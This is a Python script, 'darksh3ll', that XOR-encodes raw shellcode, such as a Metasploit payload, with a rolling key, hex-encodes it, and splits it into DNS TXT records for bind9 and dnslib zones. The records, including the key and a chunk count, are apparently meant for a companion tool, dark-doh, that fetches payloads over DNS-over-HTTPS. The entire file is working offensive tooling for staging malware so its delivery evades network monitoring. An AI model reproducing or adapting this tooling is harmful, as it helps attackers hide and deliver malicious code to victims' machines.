#!/usr/bin/env python3

# - The script that prepares DNS zones to be used with dark-doh
# - bind and dnslib are supported

# darksh3ll v1.0
# 11 August 2022: release without script's input checks

import argparse, sys, struct, os, subprocess, pefile, time
from os import path
from termcolor import colored

def sc_encode(sc_file, xorkey):
    x = 0; output = b""; 
    key = int.from_bytes(xorkey.encode(),byteorder='little')

    try:
        with open(sc_file, "br") as f:
            payload = f.read()
    except Exception as e:
        print("Can't open {0}".format(sc_file))
        print("Exception: {0}".format(e))
        quit()

    if len(payload) % 4:
        payload += b"\x90" * (4 - (len(payload) % 4))

    while x < len(payload):
        d = struct.unpack("<L", payload[x:x+4])
        output += struct.pack("<L", d[0] ^ key)
        key += 1; x += 4
    
    alphanum = "".join("{:02X}".format(c) for c in output)

    return alphanum

def sc_split(string, txtsize, path, xorkey, fname):
	outputFolder = os.path.splitext(path)[0] + "-output/"
	try: 
		os.mkdir(outputFolder) 
	except OSError as error: 
		print(error)

	ns_file = open(outputFolder + "_" + os.path.splitext(os.path.basename(path))[0] + ".dnslib-records", "w")
	bind_file = open(outputFolder + "_" + os.path.splitext(os.path.basename(path))[0] + ".bind9-records", "w")

	chunks = ["test"]
	n = int(txtsize); i = 0; j = 1
	while i < len(string):
		if i+n < len(string):
			chunks.append(string[i:i+n])
		else:
			chunks.append(string[i:len(string)])
		ns_file.write('D.' + fname + str(j) + ': [TXT("' + chunks[j] + '")],\n')
		bind_file.write(fname + str(j) + '\t1m\tIN\tTXT\t' + '"' + chunks[j] + '"' + '\n')
		i += n; j += 1

	ns_file.write('D.' + fname + '0: [TXT("' + xorkey + '")],\n')
	ns_file.write('D.' + fname + ': [TXT("' + str(j-1) + '")],\n')
	bind_file.write(fname + str(0) + '\t1m\tIN\tTXT\t' + '"' + xorkey + '"' + '\n')
	bind_file.write(fname + '\t1m\tIN\tTXT\t' + '"' + str(j-1) + '"' + '\n')

	print("dnslib compatible zone records are written to the file: " + outputFolder + "_" + os.path.splitext(os.path.basename(path))[0] + ".dnslib-records")
	print("bind9 compatible zone records are written to the file: " + outputFolder + "_" + os.path.splitext(os.path.basename(path))[0] + ".bind9-records")
	ns_file.close(); bind_file.close();

	return (j-1);

def start_menu():
    parser = argparse.ArgumentParser(
        description = 
'''
~~~~~ py script that generates dns zone files to be used with dark-doh ~~~~~
''',
        epilog =
'''

''', formatter_class = argparse.RawTextHelpFormatter)
    parser.add_argument('-sc_file', help =
'''
The file to be prepared or a raw shellcode, ex: msf.raw
''')
    parser.add_argument('-xkey', help =
'''
4-bytes XOR key value (no input checks), ex: test
''')
    parser.add_argument('-size', help =
'''
dns TXT record size up to 255, ex: 100
''')
    parser.add_argument('-dnsfile', help =
'''
The subdomain name used for file serving, ex: filename
''')

    args=parser.parse_args()
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()
    else:
        return args.sc_file, args.xkey, args.size, args.dnsfile

if __name__=='__main__':

	sc_file, xkey, size, dnsfile = start_menu()

	sc_alpha_string = sc_encode(sc_file, xkey)

	sc_split(sc_alpha_string, size, sc_file, xkey, dnsfile)

	exit(0);
